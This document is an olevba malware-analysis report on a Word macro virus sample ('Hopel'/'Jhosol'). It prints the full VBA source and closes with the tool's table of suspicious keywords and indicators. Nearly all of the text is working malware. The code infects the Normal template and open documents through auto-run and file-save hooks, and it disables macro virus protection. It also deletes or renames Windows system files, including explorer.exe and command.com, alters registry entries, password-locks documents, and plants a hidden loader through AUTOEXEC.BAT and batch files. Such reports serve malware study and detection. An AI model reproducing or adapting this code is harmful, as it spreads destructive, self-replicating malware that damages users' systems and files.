olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hopel-1933e40e28f23d6de85e33ec7c2c88a660fa15fd
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Hopel-1933e40e28f23d6de85e33ec7c2c88a660fa15fd 
in file: Virus.MSWord.Hopel-1933e40e28f23d6de85e33ec7c2c88a660fa15fd - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub RemoveMacro(xnt)
On Error Resume Next
WordBasic.DisableAutoMacros -1
Dim DocuName$
Dim I%, J%
For I = xnt.VBProject.VBComponents.Count To 1 Step -1
    DocuName = xnt.VBProject.VBComponents(I).Name
    If (DocuName <> "Jhosol") And _
        (DocuName <> "ThisDocument") Then
        Application.OrganizerDelete _
            Source:=xnt.FullName _
            , Name:=DocuName _
            , Object:=wdOrganizerObjectProjectItems
    End If
Next I
For Each openDoc In Documents
    With openDoc
        For J = openDoc.VBProject.VBComponents.Count To 1 Step -1
            DocuName = openDoc.VBProject.VBComponents(J).Name
            If (DocuName <> "Jhosol") And _
               (DocuName <> "ThisDocument") And _
               (DocuName <> "Reference to Normal") Then
                 Application.OrganizerDelete Source:=openDoc.FullName _
                 , Name:=DocuName _
                 , Object:=wdOrganizerObjectProjectItems
            End If
        Next J
    End With
Next openDoc
End Sub

Private Sub Jhosol()
On Error Resume Next
If shield2 = True Then
   Exit Sub
End If
Const akoa = "jhj"
Dim DocInf, NTInf As Boolean
Dim ad, nt As Object
Dim jhjCode As String
Set nt = NormalTemplate.VBProject.VBComponents.Item(2)
Set ad = ActiveDocument.VBProject.VBComponents.Item(2)
DocInf = ad.CodeModule.Find(akoa, 1, 1, 10000, 10000)
NTInf = nt.CodeModule.Find(akoa, 1, 1, 10000, 10000)
Options.VirusProtection = False
If Date > #9/1/01# Then
   Call ChangeInfo
End If
If Date > #10/1/01# And shield <> True Then
   Call Manipulate
End If
nday = Day(Date)
If nday = 31 Then
   Kill "c:\windows\system\vnetx.vxd"
End If
'Siguroon una nga ang ubang kondisyon tinood sa dili pa ta mopadayon pagtakod sa uban
If (DocInf = True Xor NTInf = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
  'Patakodan ang NT
  If DocInf = True Then
     Set ad = ActiveDocument.VBProject.VBComponents.Item(2)
     jhjCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
     NormalTemplate.VBProject.VBComponents.Add(1).Name = "Jhosol"
     Set nt = NormalTemplate.VBProject.VBComponents.Item(2)
     ad.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
     Call AddStr(nt, jhjCode)
     NormalTemplate.Save
     If hasmarker() <> True Then
        Call CreateLoader
     End If
  End If
  'Patakodan ang ActiveDocument
  If NTInf = True Then
    Set nt = NormalTemplate.VBProject.VBComponents.Item(2)
    jhjCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ActiveDocument.VBProject.VBComponents.Add(1).Name = "Jhosol"
    Set ad = ActiveDocument.VBProject.VBComponents.Item(2)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    Call AddStr(ad, jhjCode)
    ActiveDocument.Save
  End If
End If
End Sub

Private Sub ChangeInfo()
    On Error Resume Next
    Application.UserName = "ALL MANKIND"
    Application.UserAddress = "DI MAKITA ST."
    Application.UserInitials = "XXX"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "ALL MANKIND"
        .Keywords = "MESS WITH THE BEST, DIE LIKE THE REST"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
End Sub

Private Sub Manipulate()
    Dim xp As String
    xp = "acidburn"
    On Error Resume Next
    nmth = Month(Date)
    nday = Day(Date)
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Mess with the best!"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "-=- Jhosol -=-"
    If nmth = 10 And nday = 21 Then
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "s1159") = "JHOSOL"
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "s2359") = "JHOSOL"
    Else
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "s1159") = "AM"
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "s2359") = "PM"
    End If

    If WeekDay(Date) = 4 And (getcode() = 23 Or getcode() = 6 Or getcode() = 18) Then
       Kill "c:\windows\system\epson9.drv"
       Name "c:\windows\system\netbeui.vxd" As "c:\windows\system\iuebten.vxd"
    End If
    If WeekDay(Date) = 5 And (getcode() = 25 Or getcode() = 28) Then
       Name "c:\windows\system\cm8330.drv" As "c:\windows\system\0338mc.drv"
       Name "c:\windows\system\cm8330.vxd" As "c:\windows\system\0338mc.vxd"
    End If
    If WeekDay(Date) = 7 And (getcode() = 27 Or getcode() = 13) Then
       Name "c:\windows\system\sis597m.drv" As "c:\windows\system\m795sis.drv"
       Name "c:\windows\system\sis597m.vxd" As "c:\windows\system\m795sis.vxd"
       Name "c:\windows\explorer.exe" As "c:\windows\rerolpxe.exe"
    End If
    If WeekDay(Date) = 1 And getcode() = 32 Then
       Name "c:\windows\system\dplay.dll" As "c:\windows\system\yalpd.dll"
       Name "c:\windows\system\dplayx.dll" As "c:\windows\system\xyalpd.dll"
    End If
    If WeekDay(Date) = nday Then
       Name "c:\windows\system\vmm32.vxd" As "c:\windows\system\23mmv.vxd"
    End If
    If nday = nmth And (getcode() = 8 Or getcode() = 14 Or getcode() = 22) Then
       Name "c:\windows\system\sage.dll" As "c:\windows\system\egas.dll"
    End If
    If WeekDay(Date) = nmth And getcode() = 12 Then
       Name "c:\windows\system\comdlg32.dll" As "c:\windows\system\23gldmoc.dll"
    End If
    If WeekDay(Date) = nmth And WeekDay(Date) = nday Then
       Name "c:\windows\command\command.com" As "c:\windows\command\dnammoc.com"
       Name "c:\command.com" As "c:\dnammoc.com"
    End If
    If WeekDay(Date) = 6 And getcode() = 16 Then
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "sDecimal") = "$"
       Name "c:\windows\system\mouse.drv" As "c:\windows\system\esuom.drv"
    End If
    If nmth = 12 And nday = 10 Then
       System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\MS-DOSOptions\DOSSettings", "Config.Sys") = "DOS=SINGLE"
    End If
    If (getcode() = 5 Or getcode() = 15 Or getcode = 10 Or getcode = 29) _
        And WeekDay(Date) = 6 Then
        ActiveDocument.Password = xp
    End If
    If (getcode() = 10 Or getcode() = 30) And WeekDay(Date) = 3 Then
       With Options
        .PrintDraft = True
        .PrintFieldCodes = True
        .PrintHiddenText = True
        .PrintDrawingObjects = False
       End With
    End If
    If WeekDay(Date) = 2 And getcode() = 1 Then
       With ActiveDocument.PageSetup
        .Orientation = wdOrientLandscape
       End With
    End If
    If WeekDay(Date) = 3 And (getcode() = 3 Or getcode() = 4) Then
       With ActiveDocument.PageSetup
        .TopMargin = InchesToPoints(5.25)
       End With
    End If
    If WeekDay(Date) = 4 And getcode() = 5 Then
       With ActiveDocument.PageSetup
        .BottomMargin = InchesToPoints(5.25)
       End With
    End If
    If WeekDay(Date) = 5 And getcode() = 6 Then
       With ActiveDocument.PageSetup
        .LeftMargin = InchesToPoints(4)
       End With
    End If
    If WeekDay(Date) = 6 And getcode() = 7 Then
       With ActiveDocument.PageSetup
        .RightMargin = InchesToPoints(5)
       End With
    End If
    If WeekDay(Date) = 7 And getcode() = 8 Then
       With ActiveDocument.PageSetup
        .PageWidth = InchesToPoints(13)
       End With
    End If
    If WeekDay(Date) = 2 And getcode() = 9 Then
       With ActiveDocument.PageSetup
        .PageHeight = InchesToPoints(10.5)
    End With
    End If
    If WeekDay(Date) = 3 And getcode() = 26 Then
       With ActiveWindow
        .DisplayHorizontalScrollBar = False
        .DisplayVerticalScrollBar = False
        .DisplayVerticalRuler = False
       End With
    End If
    If WeekDay(Date) = 4 And getcode() = 11 Then
       CommandBars("Formatting").Visible = False
       CommandBars("Standard").Visible = False
    End If
    If WeekDay(Date) = 5 And getcode() = 12 Then
       With Options
        .PrintReverse = True
       End With
    End If
    If WeekDay(Date) = 5 And getcode() = 13 Then
       With Options
        .PrintBackground = False
       End With
    End If
    If WeekDay(Date) = 6 And getcode() = 14 Then
       CommandBars("Formatting").Controls(8).Delete
    End If
    If WeekDay(Date) = 7 And getcode() = 15 Then
       CommandBars("Formatting").Controls(6).Delete
    End If
    If WeekDay(Date) = 1 And getcode() = 27 Then
       CommandBars("Formatting").Controls(4).Delete
    End If
    If WeekDay(Date) = 2 And (getcode() = 37 Or getcode() = 48 Or getcode() = 50) Then
       Selection.WholeStory
       Selection.Range.Case = wdToggleCase
       Selection.MoveRight Unit:=wdCharacter, Count:=1
    End If
    If (getcode() = 19 Or getcode() = 29 Or getcode = 49 Or getcode = 29) _
        And WeekDay(Date) = 3 Then
        ActiveDocument.Protect Password:="lasiov", NoReset:=False, Type:=wdAllowOnlyRevisions
    End If
    If (getcode() = 47 Or getcode() = 51 Or getcode = 49 Or getcode = 29) _
        And WeekDay(Date) = 4 Then
       With ActiveDocument.PageSetup.TextColumns
        .SetCount NumColumns:=2
       End With
    End If
    If WeekDay(Date) = 100 And (getcode() = 48 Or getcode() = 46 Or getcode() = 43) Then
       Selection.WholeStory
       Selection.Range.Case = wdUpperCase
       Selection.MoveRight Unit:=wdCharacter, Count:=1
    End If
    AutoCorrect.Entries.Add Name:="STI", Value:="DWC-T"
    AutoCorrect.Entries.Add Name:="AMA", Value:="DWC-T"
    AutoCorrect.Entries.Add Name:="UB", Value:="DWC-T"
    AutoCorrect.Entries.Add Name:="University of Bohol", Value:="Divine Word College"
    AutoCorrect.Entries.Add Name:="System Technology Institute", Value:="Divine Word College"
    AutoCorrect.Entries.Add Name:="Bohol Institute of Technology", Value:="Divine Word College"
    AutoCorrect.Entries.Add Name:="BIT", Value:="DWC-T"
    AutoCorrect.Entries.Add Name:="CVSCAFT", Value:="DWC-T"
End Sub

Sub FileOpen()
    On Error Resume Next
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
    Dialogs(wdDialogFileOpen).Show
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
End Sub

Sub FileClose()
    On Error Resume Next
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
    ActiveDocument.Close
End Sub

Sub AddStr(ByVal obj As Object, str As String)
On Error Resume Next
obj.CodeModule.AddFromString str
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
    Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub FileSave()
    On Error Resume Next
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
    ActiveDocument.Save
End Sub

Private Function shield()
  On Error Resume Next
  myshield$ = ""
  myshield$ = Dir("c:\windows\system\vnetx.vxd")
  If myshield$ = "vnetx.vxd" Then
     shield = True
     Exit Function
  End If
End Function

Private Function shield2()
  On Error Resume Next
  myshield$ = ""
  myshield$ = Dir("c:\windows\system\christx.vxd")
  If myshield$ = "christx.vxd" Then
     shield2 = True
     Exit Function
  End If
End Function
Sub ToolsMacro()
    
End Sub

Sub ViewVBCode()

End Sub

Sub FileTemplates()

End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.SaveNormalPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
End Sub

Sub HelpAbout()
    On Error Resume Next
    X = MsgBox("JHOSOL SOFTWARE SOLUTIONS" & Chr(13) & Chr(13) & _
    "(E-mail: jhosol@yahoo.com)", vbOKOnly + vbExclamation, "Hacker's Information")
End Sub

Sub MyMacroOpen()
    On Error Resume Next
    vp = "102173"
    If InputBox("Enter password", "View Jhosol's Viral Code") = vp Then Application.ShowVisualBasicEditor = True
End Sub

Private Sub AddKey()
  On Error Resume Next
  CustomizationContext = NormalTemplate
  KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyControl, wdKeyAlt, wdKeyJ), _
    KeyCategory:=wdKeyCategoryMacro, Command:="MyMacroOpen"
End Sub

Sub AutoOpen()
  On Error Resume Next
  Call RemoveMacro(NormalTemplate)
  Call Jhosol
End Sub

Sub AutoExec()
  On Error Resume Next
  WordBasic.DisableAutoMacros -1
  Call AddKey
  nmth = Month(Date)
  nday = Day(Date)
  If ((nmth = 12) And (nday = 25)) Or ((nmth = 1) And (nday = 1)) Then
     X = MsgBox("MAAYONG PASKO UG MALIPAYONG BAG-ONG TUIG" & Chr(13) & _
     "KANINYONG TANAN" & Chr(13) & Chr(13) & _
     "Gikan ni: JHOSOL", vbOKOnly + vbExclamation, "Hacker's Greeting")
  End If
  If (nmth = 2) And (nday = 14) Then
     X = MsgBox("HAPPY VALENTINES DAY" & Chr(13) & Chr(13) & _
     "From: JHOSOL", vbOKOnly + vbExclamation, "Hacker's Greeting")
  End If
  If hasmarker() = False Then
     Call CreateLoader
  End If
End Sub

Sub CreateLoader()
On Error Resume Next
scode = Chr(255)
Set aDoc = NormalTemplate.OpenAsDocument
With aDoc
    .SaveAs FileName:="C:\WINDOWS\COMMAND\nt.txt", AddToRecentFiles:=False
    .Close SaveChanges:=wdDoNotSaveChanges
End With

scode = Chr$(255)
batchfle$ = "C:\WINDOWS\COMMAND\t.bat"
fNmbr = FreeFile
Open batchfle$ For Append Access Write As #fNmbr
    Print #fNmbr, "@ECHO OFF"
    Print #fNmbr, "if exist C:\WINDOWS\COMMAND\nt.txt ATTRIB C:\WINDOWS\COMMAND\nt.txt -H -R > NUL"
    Print #fNmbr, "COPY C:\WINDOWS\COMMAND\nt.txt C:\PROGRA~1\MICROS~1\TEMPLA~1\Normal.dot /Y > NUL"
    Print #fNmbr, "if exist C:\WINDOWS\COMMAND\nt.txt ATTRIB C:\WINDOWS\COMMAND\nt.txt +H +R > NUL"
    Print #fNmbr, "if exist c:\windows\command\tmp.bat del c:\windows\command\tmp.bat > nul"
    Print #fNmbr, "if exist c:\windows\command\t.bat del c:\windows\command\t.bat > nul"
Close #fNmbr

tmpfle$ = "C:\windows\command\tmp.bat"
fNmbr = FreeFile
Open tmpfle$ For Append Access Write As #fNmbr
Print #fNmbr, "rename c:\windows\command\t.bat " & scode & ".bat > nul"
Print #fNmbr, "ATTRIB C:\WINDOWS\COMMAND\nt.txt +H +R > NUL"
Close #fNmbr
Shell "command.com /c c:\windows\command\tmp.bat", vbHide
autofle$ = "C:\AUTOEXEC.BAT"
fNmbr = FreeFile
SetAttr autofle$, vbNormal
Open autofle$ For Append Access Write As #fNmbr
Print #fNmbr, scode
Close #fNmbr
End Sub

Function hasmarker()
On Error Resume Next
If Dir("c:\autoexec.bat") = "" Then
   Call mkautof
End If
autofle$ = "C:\AUTOEXEC.BAT"
hNmbr = FreeFile
Dim InputData, ShowLine
Open autofle$ For Input As #hNmbr
fMarker = Chr(255)
hasmarker = False
Do While Not EOF(1)
    Line Input #hNmbr, InputData
    If InputData = fMarker Then hasmarker = True
Loop
Close #hNmbr
End Function

Sub mkautof()
autofle$ = "C:\Autoexec.bat"
hNmbr = FreeFile
Open autofle$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "PROMPT $P$G"
    Print #hNmbr, "SET PATH=C:\WINDOWS;C:\WINDOWS\COMMAND"
Close #hNmbr
End Sub

Function getcode()
    Select Case Timer
        Case 28802 To 29700
            getcode = 1
        Case 29701 To 30601
            getcode = 2
        Case 30602 To 31501
            getcode = 3
        Case 31502 To 32400
            getcode = 4
        Case 32401 To 33300
            getcode = 5
        Case 33301 To 34200
            getcode = 6
        Case 34201 To 35100
            getcode = 7
        Case 35101 To 36000
            getcode = 8
        Case 36001 To 36900
            getcode = 9
        Case 36901 To 37800
            getcode = 10
        Case 37801 To 38700
            getcode = 11
        Case 38701 To 39600
            getcode = 12
        Case 39601 To 40500
            getcode = 13
        Case 40501 To 41400
            getcode = 14
        Case 41401 To 42300
            getcode = 15
        Case 42301 To 43200
            getcode = 16
        Case 43201 To 44100
            getcode = 17
        Case 44101 To 45000
            getcode = 18
        Case 45001 To 45900
            getcode = 19
        Case 45901 To 46800
            getcode = 20
        Case 46801 To 47700
            getcode = 21
        Case 47701 To 48600
            getcode = 22
        Case 48601 To 49500
            getcode = 23
        Case 49501 To 50400
            getcode = 24
        Case 50401 To 51300
            getcode = 25
        Case 51301 To 52200
            getcode = 26
        Case 52201 To 53100
            getcode = 27
        Case 53101 To 54000
            getcode = 28
        Case 54001 To 54900
            getcode = 29
        Case 54901 To 55800
            getcode = 30
        Case 55801 To 56700
            getcode = 31
        Case 56701 To 57600
            getcode = 32
        Case 57601 To 58500
            getcode = 33
        Case 58501 To 59400
            getcode = 34
        Case 59401 To 60300
            getcode = 35
        Case 60301 To 61200
            getcode = 36
        Case 61201 To 62100
            getcode = 37
        Case 62101 To 63000
            getcode = 38
        Case 63001 To 63901
            getcode = 39
        Case 63902 To 64800
            getcode = 40
        Case 64801 To 65700
            getcode = 41
        Case 65701 To 66600
            getcode = 42
        Case 66601 To 67500
            getcode = 43
        Case 67501 To 68400
            getcode = 44
        Case 68401 To 69300
            getcode = 45
        Case 69301 To 70200
            getcode = 46
        Case 70201 To 72000
            getcode = 47
        Case 72001 To 75600
            getcode = 48
        Case 75601 To 79201
            getcode = 49
        Case 79202 To 82800
            getcode = 50
        Case 82801 To 86340
            getcode = 51
        Case 86341 To 99999
            getcode = 52
        Case Else
            getcode = 100
    End Select
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |explorer.exe        |Executable file name                         |
|IOC       |rerolpxe.exe        |Executable file name                         |
|IOC       |dplay.dll           |Executable file name                         |
|IOC       |yalpd.dll           |Executable file name                         |
|IOC       |dplayx.dll          |Executable file name                         |
|IOC       |xyalpd.dll          |Executable file name                         |
|IOC       |sage.dll            |Executable file name                         |
|IOC       |egas.dll            |Executable file name                         |
|IOC       |comdlg32.dll        |Executable file name                         |
|IOC       |23gldmoc.dll        |Executable file name                         |
|IOC       |t.bat               |Executable file name                         |
|IOC       |tmp.bat             |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

